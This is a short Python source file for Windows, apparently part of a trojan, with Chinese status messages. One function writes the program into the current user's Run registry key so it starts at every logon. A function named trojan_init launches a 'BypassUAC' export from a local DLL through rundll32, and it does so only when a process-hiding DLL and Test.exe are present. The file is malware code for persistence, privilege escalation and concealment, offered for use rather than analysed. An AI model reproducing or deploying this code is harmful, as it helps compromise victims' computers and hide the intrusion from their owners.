import win32api
import win32con
import winreg
import os


def judge_key(key_name, reg_root=win32con.HKEY_CURRENT_USER, reg_path=r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"):
    reg_flags = win32con.WRITE_OWNER | win32con.KEY_WOW64_64KEY | win32con.KEY_ALL_ACCESS
    try:
        key = winreg.OpenKey(reg_root, reg_path, 0, reg_flags)
        location, type = winreg.QueryValueEx(key, key_name)
        print("键存在", "location（数据）:", location, "type:", type)
        feedback = 0
    except FileNotFoundError as e:
        print("键不存在", e)
        feedback = 1
    except PermissionError as e:
        print("权限不足", e)
        feedback = 2
    except:
        print("Error")
        feedback = 3
    return feedback


def autostart(filename=None, current_file=None, abspath=os.path.abspath(os.path.dirname(__file__))):
    path = abspath + '\\' + current_file + '.exe'
    judge = judge_key(reg_root=win32con.HKEY_CURRENT_USER,
                      reg_path=r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                      key_name=current_file)
    KeyName = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
    if judge == 0:
        print("已经开启了，无需再开启")
    elif judge == 1:
        win32api.RegSetValueEx(key, current_file, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)
        print('开机自启动添加成功！')


def trojan_init():
    work_path = os.getcwd()
    print(work_path)
    run_dll_path = "C:\\Windows\\System32\\rundll32.exe"
    uac_dll_path = "\"" + work_path + "\\BypassUAC2_Test.dll\""
    fun_name = "BypassUAC"
    cmd = run_dll_path + " " + uac_dll_path + " " + fun_name
    if os.path.exists(work_path + "\\BypassUAC2_Test.dll") \
            and os.path.exists(work_path + "\\HideProcess_ZwQuerySystemInformation_Test.dll") \
            and os.path.exists(work_path + "\\Test.exe"):
        os.system(cmd)
    else:
        return None
